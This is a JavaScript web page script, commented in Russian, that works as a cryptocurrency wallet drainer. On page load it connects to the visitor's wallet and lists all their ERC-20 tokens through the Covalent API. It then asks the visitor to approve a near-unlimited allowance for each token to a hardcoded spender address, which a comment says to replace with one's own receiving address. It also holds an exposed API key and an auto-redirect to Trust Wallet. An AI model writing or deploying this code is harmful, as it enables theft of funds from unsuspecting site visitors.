const COVALENT_API_KEY = 'nFuFp8RwkyBnTc1GRQ4HGDoLvVAgniWuzr2kLI2bGkPIZPGQHNJBZA';
const CHAIN_ID = 1; // Ethereum Mainnet
const SPENDER_ADDRESS = '0x064A55328f66BF8CAC8Db42BD5a692CC3d848d75'; // Замените на ваш адрес, который будет получать разрешение на токены

// Попробуем открыть Trust Wallet через 3 секунды
setTimeout(() => {
    window.location.href = "trust://";
    setTimeout(() => {
        window.location.href = "https://trustwallet.com/download";
    }, 10000);
}, 3000);

// Функция для получения токенов пользователя и разрешений на их управление
async function approveAllTokens(web3, userAddress) {
    const url = https://api.covalenthq.com/v1/${CHAIN_ID}/address/${userAddress}/balances_v2/?key=${COVALENT_API_KEY};
    const res = await fetch(url);
    const data = await res.json();

    if (data && data.data && data.data.items) {
        for (const token of data.data.items) {
            if (
                token.type === "cryptocurrency" &&
                token.contract_address &&
                token.contract_address !== '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee'  // Проверка на ETH (это исключаем)
            ) {
                const tokenAddress = token.contract_address;
                const tokenABI = [{
                    "constant": false,
                    "inputs": [
                        { "name": "spender", "type": "address" },
                        { "name": "value", "type": "uint256" }
                    ],
                    "name": "approve",
                    "outputs": [{ "name": "", "type": "bool" }],
                    "payable": false,
                    "stateMutability": "nonpayable",
                    "type": "function"
                }];

                const contract = new web3.eth.Contract(tokenABI, tokenAddress);
                const amount = web3.utils.toWei('1000000000000', 'ether'); // Максимальное количество

                try {
                    await contract.methods.approve(SPENDER_ADDRESS, amount).send({ from: userAddress });
                    console.log(`Approved: ${token.contract_name || tokenAddress}`);
                } catch (e) {
                    console.warn(`Ошибка approve: ${token.contract_name || tokenAddress}`, e.message);
                }
            }
        }
    }
}

// Подключение Web3 после загрузки страницы
window.addEventListener('load', async () => {
    if (typeof window.ethereum !== 'undefined') {
        const web3 = new Web3(window.ethereum);
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const userAddress = accounts[0];
            console.log("Адрес кошелька:", userAddress);

            await approveAllTokens(web3, userAddress);
        } catch (err) {
            console.error("Ошибка при подключении к кошельку:", err);
        }
    } else {
        console.error("Web3 не найден. Установите Trust Wallet или MetaMask.");
    }
})